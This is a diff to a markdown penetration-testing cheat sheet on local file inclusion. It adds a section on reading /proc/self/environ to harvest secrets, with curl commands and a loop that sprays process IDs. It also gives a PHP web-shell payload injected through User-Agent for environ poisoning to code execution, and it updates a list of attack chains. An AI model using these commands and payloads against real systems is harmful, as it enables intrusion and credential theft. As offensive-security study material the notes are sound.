@@ -522,6 +522,32 @@ done
 ffuf -w <(seq 1 25) -u 'http://target.com/?file=/proc/self/fd/FUZZ&cmd=id' -fw 1
 ```
 
+### /proc/self/environ — Harvest secrets & (sometimes) RCE
+
+`/proc/self/environ` holds the **environment of the web process**. Two independent wins from an LFI/arbitrary-read:
+
+**A. Read → secret harvest → privesc/lateral.** Apps and their systemd units routinely pass secrets as env vars — DB creds, API keys, `SECRET_KEY`, cloud tokens, and the app's `HOME`/`PWD` (which leaks the deploy path so you can then read source). No shell needed; the file read *is* the loot.
+
+```bash
+# The web process's own environment
+?file=/proc/self/environ
+curl -s "http://target.com/?file=../../../../proc/self/environ" | tr '\0' '\n'
+
+# Other processes too, if readable (a root cron/daemon may hold better secrets)
+?file=/proc/1/environ
+for p in $(seq 1 3000); do curl -s "http://t/?file=/proc/$p/environ"; done   # spray
+```
+
+> [!tip] `environ` is NUL-separated — pipe through `tr '\0' '\n'` to read it. Leaked `HOME=/home/web` / `PWD` tells you where the app lives → then read `app.py`, `config.py`, `.env`, `requirements.txt` via the same LFI. See [[Linux Priv Esc]] (Credential Hunting) for what to do with harvested creds.
+
+**B. Poison → RCE (CGI/older stacks only).** On **PHP-CGI / mod_cgi** setups the request `User-Agent` lands in the process environment as `HTTP_USER_AGENT`; inject PHP in `User-Agent`, then include `/proc/self/environ` to execute it — same family as log poisoning.
+
+```bash
+curl -A '<?php system($_GET["cmd"]); ?>' "http://target.com/?file=/proc/self/environ&cmd=id"
+```
+
+> [!warning] The poisoning→RCE path is **unreliable on modern PHP-FPM / mod_php** — the request env isn't kept in the worker's `/proc/self/environ`, so it usually just leaks static startup env, not your `User-Agent`. Treat **B** as a legacy bonus; **A (reading for secrets)** is the reliable, always-worth-it move.
+
 ### SSH Logs
 
 ```bash
@@ -1144,7 +1170,7 @@ cat /proc/net/tcp | awk '{print $2}' | grep -v local
 1. LFI → Source Code → Find creds/bugs
 2. LFI → Log Poisoning / SMTP Mail Spool → RCE
 3. LFI + Upload → RCE
-4. LFI → /proc/self/environ → Poison → RCE
+4. LFI → /proc/self/environ → harvest env secrets (creds/keys/deploy path) → privesc/lateral; or poison→RCE on CGI stacks (see the environ section above)
 5. LFI → PHP Filter Chain → RCE (no write required, PHP 7.1+)
 6. LFI → SSH Keys → Lateral movement
 7. RFI → Reverse Shell → Full system
@@ -1199,5 +1225,5 @@ cat /proc/net/tcp | awk '{print $2}' | grep -v local
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-08-13*
+*Updated: 2026-08-14*
 *Model: claude-opus-5*
